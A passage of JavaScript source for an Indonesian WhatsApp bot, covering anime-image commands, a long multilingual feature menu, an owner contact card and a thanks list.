				case 'neko': case 'waifu': case 'shinobu': case 'megumin': case 'bully': case 'cuddle': case 'cry': case 'hug': case 'awoo': case 'kiss': case 'lick': case 'pat': case 'smug': case 'bonk': case 'yeet': case 'blush': case 'smile': case 'wave': case 'highfive': case 'handhold': case 'nom': case 'bite': case 'glomp': case 'slap': case 'kill': case 'happy': case 'wink': case 'poke': case 'dance': case 'cringe': 
					load(`Loading...`)
					axios.get(`https://api.waifu.pics/sfw/${command}`)
					.then(({data}) => {
					zaki.sendImage(m.chat, data.url, mess.success, m)
					})
					break

case 'menu': case 'allmenu': case 'listmenu': {
anu = ` _*Hi Kak ${pushname} ${ucapanWaktu} 👋.*_
                
_*🇬🇧 : List of features in this bot*_.
_*🇮🇩 : Daftar Fitur Yang Ada Di Bot Ini*_.
_*🇯🇵 : このボットの機能のリスト*_.

  *[   INFORMATION   ]*
  _⫹⫺ Your Name : ${pushname}_
  _⫹⫺ Library : Baileys-Md_
  _⫹⫺ Version : 2.0.0_
  _⫹⫺ Language : Javascript_
  _⫹⫺ Author : Yusuf_
  _⫹⫺ Date Server :  ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}_
  _⫹⫺ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}_   
  _⫹⫺ Runtime : ${runtime(process.uptime())}_
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
  「 *Main Menu* 」
  » ${prefix}script
  » ${prefix}speedtest
  » ${prefix}ping
  » ${prefix}owner
  » ${prefix}menu
  » ${prefix}delete
  » ${prefix}infochat
  » ${prefix}quoted
  » ${prefix}listpc
  » ${prefix}listonline
  » ${prefix}unnom
  
  「 *Group Menu* 」
  » ${prefix}linkgroup
  » ${prefix}ephemeral [option]
  » ${prefix}setppgc [image]
  » ${prefix}setname [text]
  » ${prefix}setdesc [text]
  » ${prefix}group [option]
  » ${prefix}editinfo [option]
  » ${prefix}add @user
  » ${prefix}kick @user
  » ${prefix}hidetag [text]
  » ${prefix}tagall [text]
  » ${prefix}antilink [on/off]
  » ${prefix}mute [on/off]
  » ${prefix}promote @user
  » ${prefix}demote @user
  » ${prefix}vote [text]
  » ${prefix}devote
  » ${prefix}upvote
  » ${prefix}cekvote
  » ${prefix}hapusvote

  「 *Owner Menu* 」
  » ${prefix}react [emoji]
  » ${prefix}chat [option]
  » ${prefix}join [link]
  » ${prefix}leave
  » ${prefix}block @user
  » ${prefix}unblock @user
  » ${prefix}bcgroup [text]
  » ${prefix}bcall [text]
  » ${prefix}setppbot [image]
  » ${prefix}setexif
  
  「 *Rpg Menu* 」
  » ${prefix}berburu
  » ${prefix}mancing
  » ${prefix}menambang
  » ${prefix}mining
  » ${prefix}heal
  » ${prefix}profile
  » ${prefix}inventory
  » ${prefix}leaderboard
  » ${prefix}buy
  » ${prefix}sell

  「 *Downloader Menu* 」
  » ${prefix}tiktoknowm [url]
  » ${prefix}tiktokwm [url]
  » ${prefix}tiktokmp3 [url]
  » ${prefix}igdl [url]
  » ${prefix}zippy [url]
  » ${prefix}mediafire [url]
  » ${prefix}twitter [url]
  » ${prefix}twittermp3 [url]
  » ${prefix}facebook [url]
  » ${prefix}pinterestdl [url]
  » ${prefix}ytmp3 [url]
  » ${prefix}ytmp4 [url]
  » ${prefix}getmusic [query]
  » ${prefix}getvideo [query]
  » ${prefix}umma [url]
  » ${prefix}soundcloud [url]

  「 *Search Menu* 」
  » ${prefix}play [query]
  » ${prefix}yts [query]
  » ${prefix}google [query]
  » ${prefix}gimage [query]
  » ${prefix}pinterest [query]
  » ${prefix}wallpaper [query]
  » ${prefix}wikimedia [query]
  » ${prefix}ytsearch [query]
  » ${prefix}ringtone [query]
  » ${prefix}stalk [option] [query]
  » ${prefix}webtoons [query]
  » ${prefix}drakor [query]
  » ${prefix}anime [query]
  » ${prefix}character [query]
  » ${prefix}manga [query]

  「 *Random Menu* 」
  » ${prefix}coffe
  » ${prefix}quotesanime
  » ${prefix}motivasi
  » ${prefix}dilanquote
  » ${prefix}bucinquote
  » ${prefix}katasenja
  » ${prefix}puisi
  » ${prefix}couple
  » ${prefix}anime
  » ${prefix}waifu
  » ${prefix}husbu
  » ${prefix}neko
  » ${prefix}shinobu

  「 *Random Anime Menu* 」
  » ${prefix}loli
  » ${prefix}neko
  » ${prefix}waifu
  » ${prefix}shinobu
  » ${prefix}megumin
  » ${prefix}bully
  » ${prefix}cuddle
  » ${prefix}cry
  » ${prefix}hug
  » ${prefix}awoo
  » ${prefix}kiss
  » ${prefix}lick
  » ${prefix}pat
  » ${prefix}smug
  » ${prefix}bonk
  » ${prefix}yeet
  » ${prefix}blush
  » ${prefix}smile
  » ${prefix}wave
  » ${prefix}highfive
  » ${prefix}handhold
  » ${prefix}nom
  » ${prefix}bite
  » ${prefix}glomp
  » ${prefix}slap
  » ${prefix}kill
  » ${prefix}happy
  » ${prefix}wink
  » ${prefix}poke
  » ${prefix}dance
  » ${prefix}cringe

  「 *Text Pro Menu* 」
  » ${prefix}3dchristmas
  » ${prefix}3ddeepsea
  » ${prefix}americanflag
  » ${prefix}3dscifi
  » ${prefix}3drainbow
  » ${prefix}3dwaterpipe
  » ${prefix}halloweenskeleton
  » ${prefix}sketch
  » ${prefix}bluecircuit
  » ${prefix}space
  » ${prefix}metallic
  » ${prefix}fiction
  » ${prefix}greenhorror
  » ${prefix}transformer
  » ${prefix}berry
  » ${prefix}thunder
  » ${prefix}magma
  » ${prefix}3dcrackedstone
  » ${prefix}3dneonlight
  » ${prefix}impressiveglitch
  » ${prefix}naturalleaves
  » ${prefix}fireworksparkle
  » ${prefix}matrix
  » ${prefix}dropwater
  » ${prefix}harrypotter
  » ${prefix}foggywindow
  » ${prefix}neondevils
  » ${prefix}christmasholiday
  » ${prefix}3dgradient
  » ${prefix}blackpink
  » ${prefix}gluetext

  「 *Photo Oxy Menu* 」
  » ${prefix}shadow
  » ${prefix}romantic
  » ${prefix}smoke
  » ${prefix}burnpapper
  » ${prefix}naruto
  » ${prefix}lovemsg
  » ${prefix}grassmsg
  » ${prefix}lovetext
  » ${prefix}coffecup
  » ${prefix}butterfly
  » ${prefix}harrypotter
  » ${prefix}retrolol

  「 *Ephoto Menu* 」
  » ${prefix}ffcover
  » ${prefix}crossfire
  » ${prefix}galaxy
  » ${prefix}glass
  » ${prefix}neon
  » ${prefix}beach
  » ${prefix}blackpink
  » ${prefix}igcertificate
  » ${prefix}ytcertificate

  「 *Fun Menu* 」
  » ${prefix}bagaimanakah
  » ${prefix}kapankah
  » ${prefix}apakah
  » ${prefix}bisakah
  » ${prefix}rate
  » ${prefix}wangy
  » ${prefix}gantengcek
  » ${prefix}cekganteng
  » ${prefix}cantikcek
  » ${prefix}cekcantik
  » ${prefix}sangecek
  » ${prefix}ceksange
  » ${prefix}cekme
  » ${prefix}gaycek
  » ${prefix}cekgay
  » ${prefix}lesbicek
  » ${prefix}halah
  » ${prefix}hilih
  » ${prefix}huluh
  » ${prefix}heleh
  » ${prefix}holoh
  » ${prefix}jadian
  » ${prefix}jodohku
  » ${prefix}delttt
  » ${prefix}tictactoe
  » ${prefix}family100
  » ${prefix}tebak [option]
  » ${prefix}math [mode]
  » ${prefix}suitpvp [@tag]

  「 *Primbon Menu* 」
  » ${prefix}nomorhoki
  » ${prefix}artimimpi
  » ${prefix}artinama
  » ${prefix}ramaljodoh
  » ${prefix}ramaljodohbali
  » ${prefix}suamiistri
  » ${prefix}ramalcinta
  » ${prefix}cocoknama
  » ${prefix}pasangan
  » ${prefix}jadiannikah
  » ${prefix}sifatusaha
  » ${prefix}rezeki
  » ${prefix}pekerjaan
  » ${prefix}nasib
  » ${prefix}penyakit
  » ${prefix}tarot
  » ${prefix}fengshui
  » ${prefix}haribaik
  » ${prefix}harisangar
  » ${prefix}harisial
  » ${prefix}nagahari
  » ${prefix}arahrezeki
  » ${prefix}peruntungan
  » ${prefix}weton
  » ${prefix}karakter
  » ${prefix}keberuntungan
  » ${prefix}memancing
  » ${prefix}masasubur
  » ${prefix}zodiak
  » ${prefix}shio

  「 *Convert Menu* 」
  » ${prefix}toimage
  » ${prefix}removebg
  » ${prefix}sticker
  » ${prefix}emojimix
  » ${prefix}tovideo
  » ${prefix}togif
  » ${prefix}tourl
  » ${prefix}tovn
  » ${prefix}tomp3
  » ${prefix}toaudio
  » ${prefix}ebinary
  » ${prefix}dbinary
  » ${prefix}styletext
  » ${prefix}smeme

  「 *Database Menu* 」
  » ${prefix}setcmd
  » ${prefix}listcmd
  » ${prefix}delcmd
  » ${prefix}lockcmd
  » ${prefix}addmsg
  » ${prefix}listmsg
  » ${prefix}getmsg
  » ${prefix}delmsg

  「 *Anonymous Menu* 」
  » ${prefix}anonymous
  » ${prefix}start
  » ${prefix}next
  » ${prefix}keluar
  » ${prefix}sendkontak

  「 *Islamic Menu* 」
  » ${prefix}iqra
  » ${prefix}hadist
  » ${prefix}alquran
  » ${prefix}juzamma
  » ${prefix}tafsirsurah

  「 *Voice Changer* 」
  » ${prefix}bass
  » ${prefix}blown
  » ${prefix}deep
  » ${prefix}earrape
  » ${prefix}fast
  » ${prefix}fat
  » ${prefix}nightcore
  » ${prefix}reverse
  » ${prefix}robot
  » ${prefix}slow
  » ${prefix}tupai`
  // -----[ Note : Untuk Menggunakan Menu Yang Kalian Mau Cukup Hapus /* sampai */ & Jika Sudah Dihapus Maka Tambah /* xxxxxx */ Agar Tidak Terdetek ]-----

// MODEL MENU SEKARANG : LOC \\

//━━━━━━━━━━━━━━━[ MENU LOC ]━━━━━━━━━━━━━━━\\
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ templateMessage: { hydratedTemplate: { hydratedContentText: anu.trim(), locationMessage: { jpegThumbnail: fs.readFileSync('./media/menu.jpg') }, hydratedFooterText: `Jangan Spam Bot Jika Tidak Ingin Di Banned!`, hydratedButtons: [{ urlButton: { displayText: 'YouTube', url: 'https://m.youtube.com/channel/UCHIMODDER'} }, { urlButton: { displayText: 'Group', url: 'https://chat.whatsapp.com/FZlu1bLAaoZDaIpPGq7GyS'} }, { quickReplyButton: { displayText: 'Owner', id: 'owner', } }, { quickReplyButton: { displayText: 'Donate', id: 'donate', } }] } } }), { userJid: m.sender, quoted: m }); //conn.reply(m.chat, text.trim(), m) 
  zaki.relayMessage( m.chat, template.message, { messageId: template.key.id } )

  
//━━━━━━━━━━━━━━━[ MENU IMG ]━━━━━━━━━━━━━━━\\
/*let message = await prepareWAMessageMedia({ image: fs.readFileSync('./media/menu.jpg') }, { upload: zaki.waUploadToServer })
                const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                    templateMessage: {
                        hydratedTemplate: {
                            imageMessage: message.imageMessage,
                            hydratedContentText: anu,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: 'Instagram',
                                    url: 'https://instagram.com/iamkizakixd'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Owner Number',
                                    phoneNumber: '+62 882-9202-4190'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Speed',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Script',
                                    id: 'sc'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Owner',
                                    id: 'owner'
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat, quoted: m })
                zaki.relayMessage(m.chat, template.message, { messageId: template.key.id })*/
}                
break
case 'owner': case 'creator': {
                let vcard = 'BEGIN:VCARD\n'
    + 'VERSION:3.0\n' 
    + 'N:;YusufKun;;;'
    + 'FN:YusufKun\n'
    + 'ORG:𝙸 𝙰𝚖 Yusuf;\n' //Nama Kalian
    + 'item1.TEL;type=CELL;type=VOICE;waid=6285770017326:+62 857-7001-7326\n' //Nomor Kalian
    + 'item1.X-ABLabel:Creator TheGreatBot - MDt\n' //Info Kalian
    + 'item2.EMAIL;type=INTERNET:bostonb859@gmail.com\n' // Email Kalian
    + 'item2.X-ABLabel:Email\n'
    + 'item3.URL:https://instagram.com/\n' //Ig Kalian Atau Web Kalian
    + 'item3.X-ABLabel:Instagram\n'
    + 'item4.ADR:;;China;;;;\n' //Negara Kalian
    + 'item4.X-ABLabel:Region\n'
    + 'END:VCARD'
zaki.sendMessage(m.chat, { contacts: { displayName: '𝙸 𝙰𝚖 Yusuf', contacts: [{ vcard }] } }, { quoted: m })
            }
break 

//Tqtq jna diapus             
case 'tqtq': case 'thanksto':{
txt = `
   *｢  THANKS TO  ｣*  
• Allah Swt.
• Nabi Muhammad Saw.
• Kedua Orang Tua
• Dika Ardnt
• KiZakiXD
• Layna Bot
• Yogi Prasetya
• Mel Bot
• ZackMans   
• Richdwayne
• Febz
• X-None Team
• All Creator
• All Friends
• My Subscribers
`
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ templateMessage: { hydratedTemplate: { hydratedContentText: txt.trim(), locationMessage: { jpegThumbnail: fs.readFileSync('./media/menu.jpg') }, hydratedFooterText: `Terima Kasih Telah Menggunakan Script Ini, Mohon Jangan Di Perjual Belikan!`, hydratedButtons: [{ quickReplyButton: { displayText: 'Back To Menu', id: 'menu', } }] } } }), { userJid: m.sender, quoted: m }); //conn.reply(m.chat, text.trim(), m) 
  zaki.relayMessage( m.chat, template.message, { messageId: template.key.id } )
}
break
case 'script': case 'sc':
                m.reply('```Script Update From : https://m.youtube.com/channel/UCHIMODDER``` 